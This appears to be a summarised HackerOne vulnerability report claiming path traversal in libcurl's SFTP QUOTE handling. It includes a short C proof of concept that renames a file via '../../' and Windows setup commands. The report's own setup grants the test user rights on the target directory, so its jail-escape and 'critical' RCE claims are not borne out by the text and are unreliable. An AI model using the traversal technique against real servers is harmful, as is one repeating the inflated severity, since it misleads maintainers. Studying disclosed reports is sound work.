# Path Traversal in SFTP QUOTE command leads to Arbitrary File Write and potential RCE

## Metadata
- **Source:** HackerOne
- **Report:** 3293177 | https://hackerone.com/reports/3293177
- **Submitted:** 2025-08-09
- **Reporter:** z1andr4g0n
- **Program:** libcurl
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Path Traversal, Arbitrary File Write, Directory Traversal, Remote Code Execution (potential)
- **CVEs:** None
- **Category:** memory-binary

## Summary
libcurl's SFTP QUOTE command processing fails to sanitize user-provided paths for traversal sequences (../), allowing attackers to perform arbitrary file operations outside the intended directory. An attacker can exploit this to write files outside the user's home directory, potentially leading to RCE by overwriting sensitive files like authorized_keys or system scripts.

## Attack scenario
1. Attacker crafts a malicious SFTP QUOTE command containing path traversal sequences (../../) targeting a file in the user's home directory
2. Attacker uses libcurl API with CURLOPT_POSTQUOTE option to issue rename/delete/write commands with traversal paths
3. libcurl's Curl_get_pathname function fails to sanitize the path, allowing the traversal to proceed unchecked
4. The SFTP server executes the command, moving/deleting/writing the file to a location outside the user's intended directory
5. Attacker leverages file write capability to overwrite sensitive files (authorized_keys, cron jobs, system scripts)
6. Overwritten files execute with elevated privileges or allow attacker SSH access, achieving Remote Code Execution

## Root cause
The Curl_get_pathname function in lib/vssh/curl_path.c does not properly validate or sanitize user-supplied paths before processing SFTP QUOTE commands. The function fails to reject or neutralize path traversal sequences like ../ that allow directory escape.

## Attacker mindset
An attacker who can control SFTP operations through a libcurl-based application seeks to escape directory restrictions. By injecting traversal sequences into QUOTE commands, they can write files to arbitrary locations on the server, establishing persistence or gaining code execution through overwriting scripts or SSH configuration files.

## Defensive takeaways
- Implement strict path validation in SFTP path handling functions - reject absolute paths and path traversal sequences (../, .., etc.)
- Use canonicalization functions to resolve paths to their absolute form and verify they remain within the intended directory
- Sanitize all user-supplied path components before passing to SFTP operations
- Restrict QUOTE command usage in SFTP implementations or provide allowlist of safe commands
- Apply principle of least privilege to SFTP user accounts to limit damage from arbitrary file writes
- Implement server-side chroot jails or similar confinement mechanisms for SFTP users
- Audit all path handling code for similar traversal vulnerabilities in SSH/SFTP implementations

## Variant hunting
Search for similar path traversal vulnerabilities in: (1) Other SSH/SFTP client libraries and implementations; (2) Any function processing user-controlled file paths in libcurl's SSH modules; (3) Path handling in QUOTE commands, PRE-QUOTE, and POST-QUOTE options; (4) Similar issues in SCP operations; (5) Path normalization failures in other protocols (FTP, FTPS) that may share code patterns

## MITRE ATT&CK
- T1190
- T1021.4
- T1021.6
- T1570
- T1578
- T1036.4

## Notes
The reporter disclosed AI assistance in analysis per responsible disclosure policy. The vulnerability affects libcurl 8.15.0 and likely earlier versions. Windows-specific PoC provided but vulnerability likely affects all platforms supporting SFTP. The ability to achieve RCE depends on server permissions and file ownership. SFTP server-side protections (chroot, ACLs) may mitigate but should not be relied upon as primary defense for client-side vulnerability.

## Full report
<details><summary>Expand</summary>

### Description

#### Summary
`libcurl` is vulnerable to a path traversal attack when processing SFTP `QUOTE` commands. The internal function `Curl_get_pathname` in `lib/vssh/curl_path.c` fails to sanitize user-provided paths for traversal sequences (`../`). An attacker who can control the SFTP `QUOTE` commands can leverage this to perform arbitrary file operations (rename, delete, and with `STOR`, write) outside of the user's intended directory. This can be escalated to Remote Code Execution (RCE) on the SFTP server by overwriting sensitive files like `authorized_keys` or system scripts.

#### AI Usage Disclosure
In accordance with your policy, I disclose that this report was the result of a collaborative effort between myself and an AI assistant. The AI was used to analyze the source code, suggest potential vulnerabilities, and assist in structuring the report, while I guided the process, made the final decisions, and manually verified all findings, including the vulnerability analysis and Proof of Concept code.

---

#### Affected version
This was reproduced on a system using libcurl linked with libssh2. The vulnerability is in `libcurl`'s own path handling code and is likely present in recent versions. The `curl -V` output on the test system is:
```
Dragon@DESKTOP-2CIPGDF MINGW64 /c/Users/Dragon/Desktop
# curl -V
curl 8.15.0 (Windows) libcurl/8.15.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8
libpsl/0.21.5 libssh2/1.11.1 nghttp2/1.65.0 ngtcp2/1.13.0 nghttp3/1.10.1
Release-Date: 2025-07-16
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 po
p3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTL
M PSL SPNEGO SSL SSPI threadsafe TLS-SRP UnixSockets zstd
```

#### Steps To Reproduce
This vulnerability can be reliably reproduced in a local Windows environment.

1.  **[Setup Step 1] Install and Run OpenSSH Server:**
    *   On a Windows 10/11 machine, install the "OpenSSH Server" via Optional Features (`Settings -> Apps -> Optional features -> Add a feature`).
    *   Start the service using PowerShell (as Admin): `Start-Service sshd` and set it to automatic: `Set-Service -Name sshd -StartupType 'Automatic'`.
    *   Create a local test user: `net user testuser testpass /add`.

2.  **[Setup Step 2] Prepare Target Files and Directories:**
    *   Create a file to be moved in the test user's home directory:
        `echo. > C:\Users\testuser\file_to_move.txt`
    *   Create the target directory for the attack:
        `mkdir C:\tmp\attack_target`
    *   Grant the test user permissions on the target directory:
        `icacls C:\tmp\attack_target /grant testuser:(OI)(CI)F`

3.  **[Setup Step 3] Proof of Concept Code (`poc.c`):**
    *   Save the following C code as `poc.c`. This program uses `libcurl` to connect to the local SFTP server and issue a malicious `rename` command.

    ```c
    #include <stdio.h>
    #include <curl/curl.h>

    int main(void) {
        CURL *curl;
        CURLcode res;
        struct curl_slist *quote_list = NULL;

        const char *malicious_rename =
            "rename file_to_move.txt ../../tmp/attack_target/SUCCESS.txt";
        
        quote_list = curl_slist_append(quote_list, malicious_rename);

        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "sftp://127.0.0.1/");
            curl_easy_setopt(curl, CURLOPT_USERNAME, "testuser");
            curl_easy_setopt(curl, CURLOPT_PASSWORD, "testpass");
            curl_easy_setopt(curl, CURLOPT_SSH_KNOWNHOSTS, NULL);
            curl_easy_setopt(curl, CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256, NULL);
            curl_easy_setopt(curl, CURLOPT_POSTQUOTE, quote_list);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            res = curl_easy_perform(curl);
            
            if(res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n",
                        curl_easy_strerror(res));
            }
        
            curl_easy_cleanup(curl);
        }
        curl_slist_free_all(quote_list);
        curl_global_cleanup();
        return 0;
    }
    ```

4.  **[Execution Step 4] Compile and Run:**
    *   Install a MinGW-w64 toolchain (e.g., via MSYS2).
    *   Compile the PoC: `gcc poc.c -lcurl -o poc.exe`
    *   Run the PoC: `./poc.exe`

5.  **[Verification Step 5] Verify the Exploit:**
    *   Check the contents of the target directory: `dir C:\tmp\attack_target`
    *   **Result:** The file **`SUCCESS.txt`** will be present in the directory, proving that the `rename` operation successfully traversed out of the user's home directory (`C:\Users\testuser`) and wrote to `C:\tmp\attack_target`.

#### Supporting Material/References:
The vulnerability is in the function `Curl_get_pathname` in the file `lib/vssh/curl_path.c`. The function copies the user-provided path from a `QUOTE` command into the output buffer without validating or sanitizing `../` sequences, leading to the path traversal vulnerability.

## Impact

This vulnerability allows an attacker with SFTP access (even if ostensibly jailed or restricted to a home directory) to perform arbitrary file operations on any part of the filesystem where the user has OS-level permissions.

This can be directly escalated to **Remote Code Execution (RCE)**. An attacker could:
*   Overwrite a user's `~/.ssh/authorized_keys` file to gain persistent SSH access.
*   Overwrite system scripts, application binaries, or configuration files.
*   Write to web server directories to achieve web-based RCE.

This is a critical vulnerability as it completely breaks the security model of SFTP directory restrictions and can lead to a full server compromise.

</details>

---
*Analysed by Claude on 2026-05-24*
